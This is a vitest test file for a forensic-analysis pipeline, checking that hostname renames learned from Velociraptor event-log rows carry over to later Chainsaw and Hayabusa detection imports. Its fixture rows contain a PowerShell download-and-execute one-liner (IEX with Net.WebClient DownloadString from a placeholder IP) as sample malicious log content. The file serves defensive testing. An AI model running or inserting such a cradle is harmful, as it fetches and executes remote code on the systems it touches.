// Cross-file rename carry, end to end through the pipeline's importers (#1495): a file that
// carries the rename evidence teaches the case; a later file that names only the old name folds
// into the current host; a file imported EARLIER folds at the next import's settle seam.
import { describe, it, expect } from "vitest";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { MockProvider } from "../../src/providers/provider.js";
import { AnalysisPipeline } from "../../src/analysis/pipeline.js";
import { settleForensicImport } from "../../src/routes/importSettle.js";
import type { InvestigationState } from "../../src/analysis/stateTypes.js";

const OLD = "WIN-UK1GV882OK6";
const MID = "WIN-0NNTB2RTNB1";
const NEW = "DESKTOP-16OJFO6";
const IMPORTED_AT = "2026-09-21T12:00:00.000Z";

async function pipeline(): Promise<{ p: AnalysisPipeline; stateStore: StateStore }> {
  const root = await mkdtemp(join(tmpdir(), "dfir-rename-carry-"));
  const caseStore = new CaseStore(root);
  await caseStore.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: "mock" });
  const stateStore = new StateStore(caseStore);
  const p = new AnalysisPipeline({
    provider: new MockProvider("mock", "{}"),
    stateStore,
    imageLoader: async () => ({ base64: "AAAA", mimeType: "image/webp" }),
  });
  return { p, stateStore };
}

// The 032 CondensedAccountUsage rows that carry the whole chain: the machine's own account under
// the SYSTEM session (logon id 999), written by the machine under each later name.
const EVIDENCE = JSON.stringify([
  {
    _Source: "Windows.EventLogs.CondensedAccountUsage",
    EventTime: "2026-08-26T13:49:52Z",
    Computer: MID,
    EventID: 4648,
    Description: "LOGON_ATTEMPT_EXPLICIT_CREDENTIALS",
    DomainName: "WORKGROUP",
    UserName: `${OLD}$`,
    LogonId: 999,
    CredentialsUsedFor4648: "Font Driver Host\\UMFD-0",
    LogonType: "-",
    IpAddress: "-",
    ClientName: "-",
  },
  {
    _Source: "Windows.EventLogs.CondensedAccountUsage",
    EventTime: "2026-08-26T13:52:06Z",
    Computer: NEW,
    EventID: 4648,
    Description: "LOGON_ATTEMPT_EXPLICIT_CREDENTIALS",
    DomainName: "WORKGROUP",
    UserName: `${MID}$`,
    LogonId: 999,
    CredentialsUsedFor4648: "Font Driver Host\\UMFD-0",
    LogonType: "-",
    IpAddress: "-",
    ClientName: "-",
  },
]);

// A DetectRaptor Evtx row under the base-image name, with nothing in it about any rename. High, so
// it stays in the forensic timeline where the fold can be read back.
const BARE = JSON.stringify([
  {
    _Source: "DetectRaptor.Windows.Detection.Evtx",
    EventTime: "2025-12-05T03:02:24Z",
    Computer: OLD,
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EventID: 4104,
    Detection: "Malicious PowerShell Keywords",
    EventData: {
      Path: "C:\\Users\\vagrant\\Desktop\\priv.ps1",
      ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
    },
    UserSID: "S-1-5-21-908230818-3748298786-230204725-1001",
    Username: "vagrant",
  },
]);

const bareRows = (s: InvestigationState) =>
  s.forensicTimeline.filter((e) => e.description.includes("Malicious PowerShell"));

describe("importVelociraptor — a rename learned by one file reaches the case and later files (#1495)", () => {
  it("the evidence file writes the ledger; an evidence-free file imported AFTER it folds", async () => {
    const { p } = await pipeline();
    const taught = await p.importVelociraptor("c1", EVIDENCE, {
      label: "usage.json",
      idPrefix: "a",
      importedAt: IMPORTED_AT,
    });
    expect(taught.hostRenames?.map((r) => `${r.formerName}>${r.currentName}`).sort()).toEqual(
      [`${OLD}>${MID}`, `${MID}>${NEW}`].sort(),
    );
    expect(taught.hostRenames?.every((r) => r.basis === "machine-account")).toBe(true);

    const after = await p.importVelociraptor("c1", BARE, {
      label: "evtx.json",
      idPrefix: "b",
      importedAt: IMPORTED_AT,
    });
    const [row] = bareRows(after);
    expect(row.asset).toBe(NEW);
    expect(row.assetRecord).toBe(OLD);
    expect(row.description).toContain(`[logged under former hostname ${OLD}]`);
    expect(row.description).not.toContain("detection sample corpus");
    expect(row.severity).not.toBe("Info"); // no sample-corpus demotion on a renamed host's own history
  });

  it("an evidence-free file imported BEFORE the evidence folds at the next settle", async () => {
    const { p, stateStore } = await pipeline();
    const first = await p.importVelociraptor("c1", BARE, {
      label: "evtx.json",
      idPrefix: "b",
      importedAt: IMPORTED_AT,
    });
    expect(bareRows(first)[0].asset).toBe(OLD);
    expect(bareRows(first)[0].assetRecord).toBe(OLD);

    const before = await stateStore.load("c1");
    await p.importVelociraptor("c1", EVIDENCE, {
      label: "usage.json",
      idPrefix: "a",
      importedAt: IMPORTED_AT,
    });
    const { state } = await settleForensicImport(
      {
        stateStore,
        autoTagImported: async () => {},
        demoteForensicForCase: async (caseId) => stateStore.load(caseId),
      },
      "c1",
      before,
    );
    const [row] = bareRows(state);
    expect(row.asset).toBe(NEW);
    expect(row.description).toContain(`[logged under former hostname ${OLD}]`);
  });

  it("a Chainsaw export and a Hayabusa export read the same ledger", async () => {
    const { p } = await pipeline();
    await p.importVelociraptor("c1", EVIDENCE, {
      label: "usage.json",
      idPrefix: "a",
      importedAt: IMPORTED_AT,
    });
    const chainsaw = JSON.stringify([
      {
        EventTime: "2025-12-05T03:02:24Z",
        Detection: "Malicious PowerShell Keywords",
        Severity: "high",
        "Rule Group": "Sigma",
        Computer: OLD,
        Channel: "Microsoft-Windows-PowerShell/Operational",
        EventID: 4104,
        SystemData: {
          Computer: OLD,
          EventID: 4104,
          TimeCreated_attributes: { SystemTime: "2025-12-05T03:02:24Z" },
        },
        EventData: {
          ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
        },
      },
    ]);
    const cs = await p.importChainsaw("c1", chainsaw, {
      label: "chainsaw.json",
      idPrefix: "c",
      importedAt: IMPORTED_AT,
    });
    expect(bareRows(cs).map((e) => e.asset)).toEqual([NEW]);
    const hayabusa = JSON.stringify({
      Timestamp: "2025-12-05 03:02:24.000 +00:00",
      Computer: OLD,
      Channel: "PwSh",
      EventID: 4104,
      Level: "high",
      RuleTitle: "Malicious PowerShell Keywords",
      Details: "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/b')",
    });
    const hb = await p.importHayabusa("c1", hayabusa, {
      label: "hayabusa.jsonl",
      idPrefix: "h",
      importedAt: IMPORTED_AT,
    });
    const hbRows = hb.forensicTimeline.filter((e) => e.description.startsWith("Hayabusa:"));
    expect(hbRows.map((e) => e.asset)).toEqual([NEW]);
  });
});
